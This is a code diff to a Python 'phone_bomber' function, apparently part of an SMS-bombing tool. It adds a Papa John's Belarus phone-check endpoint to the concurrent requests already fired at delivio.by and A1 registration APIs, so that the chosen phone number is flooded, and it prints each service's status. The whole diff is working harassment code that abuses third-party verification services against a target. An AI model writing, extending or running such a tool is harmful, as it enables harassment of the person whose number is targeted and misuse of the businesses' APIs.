@@ -83,6 +83,12 @@ async def phone_bomber(phone):
                                            lambda: requests.request("POST",
                                                                     url='https://delivio.by/be/api/register',
                                                                     headers=delivio_headers, data=payload_delivio))
+    print(colored("Started Papa Jhons", "blue"))
+    url = f"https://api.papajohns.by/user/has-phone?lang=ru&city_id=1&platform=web&phone={phone.replace('+', '')}"
+    feature_papa_jhons = loop.run_in_executor(None,
+                                              lambda: requests.request("GET",
+                                                                       url=url,
+                                                                       headers=papa_jhons_headers, data={}))
     try:
         response_a1 = await feature_a1
         output_status(response_a1, "A1")
@@ -96,6 +102,11 @@ async def phone_bomber(phone):
     try:
         response_delivio = await feature_delivio
         output_status(response_delivio, "Delivio")
+    except Exception as e:
+        print(colored(e, "green"))
+    try:
+        response_papa_jhons = await feature_papa_jhons
+        output_status(response_papa_jhons, "Papa Jhons")
     except Exception as e:
         print(colored(e, "green"))
 
